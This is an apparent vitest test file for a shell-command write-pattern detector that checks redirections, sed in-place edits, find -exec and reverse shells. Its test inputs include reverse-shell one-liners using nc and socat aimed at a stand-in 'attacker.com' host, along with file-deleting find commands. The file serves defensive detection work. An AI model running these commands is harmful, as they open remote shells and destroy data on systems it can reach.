import { describe, it, expect } from "vitest";
import { WritePatternDetector } from "../../../src/readonly-checker/write-patterns/write-pattern-detector.js";

describe("WritePatternDetector", () => {
  const detector = new WritePatternDetector();

  describe("redirection detection", () => {
    it("should detect > stdout redirection", () => {
      expect(detector.detect("ls > file.txt")).toMatchObject({ ok: true });
      expect(detector.detect("cat file.txt > output.txt")).toMatchObject({ ok: true });
    });
    it("should detect >> append redirection", () => {
      expect(detector.detect("ls >> file.txt")).toMatchObject({ ok: true });
      expect(detector.detect("cat file.txt >> output.txt")).toMatchObject({ ok: true });
    });
    it("should detect 2> stderr redirection", () => {
      expect(detector.detect("ls 2> error.log")).toMatchObject({ ok: true });
      expect(detector.detect("cat file.txt 2>> errors.log")).toMatchObject({ ok: true });
    });
    it("should detect &> combined redirection", () => {
      expect(detector.detect("ls &> output.log")).toMatchObject({ ok: true });
    });
    it("should allow 2>/dev/null (not a write)", () => {
      expect(detector.detect("sudo cat /proc/net/ipt_stat_filter 2>/dev/null")).toMatchObject({ ok: false });
      expect(detector.detect("cat file.txt 2>/dev/null || echo missing")).toMatchObject({ ok: false });
      expect(detector.detect("ls 2>&1")).toMatchObject({ ok: false });
      expect(detector.detect("command 2>/dev/zero")).toMatchObject({ ok: false });
    });
  });

  describe("process substitution", () => {
    it("should detect >(write) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) >(sort)")).toMatchObject({ ok: true });
      expect(detector.detect("diff <(ls dir1) >(sort > /tmp/out)")).toMatchObject({ ok: true });
    });
    it("should allow <(read) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) <(ls dir2)")).toMatchObject({ ok: false });
    });
  });

  describe("here-string", () => {
    it("should detect <<< here-string", () => {
      expect(detector.detect("<<< echo hello")).toMatchObject({ ok: true });
      expect(detector.detect("command <<< data")).toMatchObject({ ok: true });
    });
  });

  describe("sed in-place", () => {
    it("should detect sed -i", () => {
      expect(detector.detect("sed -i 's/x/y/g' file.txt")).toMatchObject({ ok: true });
      expect(detector.detect("sed -ibak 's/x/y/g' file.txt")).toMatchObject({ ok: true });
    });
    it("should detect sed --in-place", () => {
      expect(detector.detect("sed --in-place 's/x/y/g' file.txt")).toMatchObject({ ok: true });
    });
    it("should detect sed -n w write", () => {
      expect(detector.detect('sed -n "w /tmp/test.txt" <<< "hello"')).toMatchObject({ ok: true });
      expect(detector.detect("sed -n 'w /tmp/out' file.txt")).toMatchObject({ ok: true });
    });
  });

  describe("find -exec", () => {
    it("should detect find -exec", () => {
      expect(detector.detect("find . -exec touch {} \\;")).toMatchObject({ ok: true });
      expect(detector.detect("find /tmp -exec rm {} \\;")).toMatchObject({ ok: true });
    });
    it("should detect find -execdir", () => {
      expect(detector.detect("find . -execdir rm {} \\;")).toMatchObject({ ok: true });
      expect(detector.detect("find . -execdir touch {} \\;")).toMatchObject({ ok: true });
    });
  });




  describe("tar create", () => {
    it("tar create/extract artık tar-handler'da kontrol edilir", () => {
      // tar pattern detection write-pattern-detector'dan kaldırıldı
      // tar-handler whitelist yaklaşımı kullanıyor
      expect(detector.detect("tar cf archive.tar .")).toMatchObject({ ok: false });
      expect(detector.detect("tar xf archive.tar .")).toMatchObject({ ok: false });
    });
  });

  describe("reverse shell detection", () => {
    it("should detect nc reverse shell", () => {
      expect(detector.detect("nc -e /bin/sh attacker.com 4444")).toMatchObject({ ok: true });
    });
    it("should detect socat reverse shell", () => {
      expect(detector.detect("socat exec:/bin/sh,pty tcp:attacker.com:4444")).toMatchObject({ ok: true });
    });
    it("should allow nc/socat read commands", () => {
      expect(detector.detect("nc -zv host 80")).toMatchObject({ ok: false });
      expect(detector.detect("socat TCP:host:80 -")).toMatchObject({ ok: false });
    });
  });

  describe("false positives", () => {
    it("should not false positive on bpftrace with open in name", () => {
      expect(detector.detect("bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(\\\"%s\\\", args->filename); }'")).toMatchObject({ ok: false });
    });
    it("should not false positive on systemtap with write in probe name", () => {
      expect(detector.detect("systemtap -e 'probe syscall.write { exit() }'")).toMatchObject({ ok: false });
    });
    it("should allow quoted > in strings", () => {
      expect(detector.detect('echo "data > file"')).toMatchObject({ ok: false });
      expect(detector.detect('grep ">" file.txt')).toMatchObject({ ok: false });
    });
  });
});
